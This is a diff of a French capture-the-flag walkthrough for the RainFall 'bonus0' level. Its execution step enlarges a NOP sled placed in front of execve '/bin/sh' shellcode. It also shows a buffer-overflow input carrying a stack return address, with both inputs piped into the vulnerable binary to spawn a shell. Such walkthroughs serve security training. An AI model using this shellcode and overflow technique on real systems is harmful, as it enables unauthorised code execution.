@@ -135,7 +135,7 @@ Attention a bien mettre l'adresse en little endian et ne pas depasser l'adresse 
 # Etape 5 : Execution
 
 ```bash
-bonus0@RainFall:~$ python -c "print '\x90' * 200 +'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > /tmp/hugo
+bonus0@RainFall:~$ python -c "print '\x90' * 500 +'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > /tmp/hugo
 bonus0@RainFall:~$  python -c "print 'A' * 9 +'\xc0\xe6\xff\xbf' + 'B' * 7" > /tmp/hugo1
 bonus0@RainFall:~$ (cat /tmp/hugo ; cat /tmp/hugo1 -) | ./bonus0
  -
